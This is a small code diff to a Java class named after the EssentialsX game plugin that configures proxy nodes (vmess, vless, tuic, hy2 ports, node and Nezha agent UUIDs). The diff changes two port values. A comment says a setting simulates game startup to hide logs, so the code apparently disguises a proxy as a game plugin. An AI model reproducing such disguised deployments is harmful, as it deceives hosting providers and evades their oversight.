@@ -83,8 +83,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("CF_IP", "ip.sb");  //优选ip
         env.put("AGENT_UUID", ""); //哪吒客户端uuid
         env.put("UUID", "dbb4eaf2-6996-40aa-b4b8-68ee18266fc4");//节点uuid
-        env.put("VM_PORT", "8001");//vmess端口
-        env.put("VL_PORT", "8002");//vless端口
+        env.put("VM_PORT", "28012");//vmess端口
+        env.put("VL_PORT", "28012");//vless端口
         env.put("tuic_port", "");//tuic端口
         env.put("hy2_port", "28012");//hy2端口
         env.put("JAR_SH", "");//模拟游戏启动，开启可以屏蔽日志，去掉则显示启动日志，也可以换成别的命令，如sleep 5
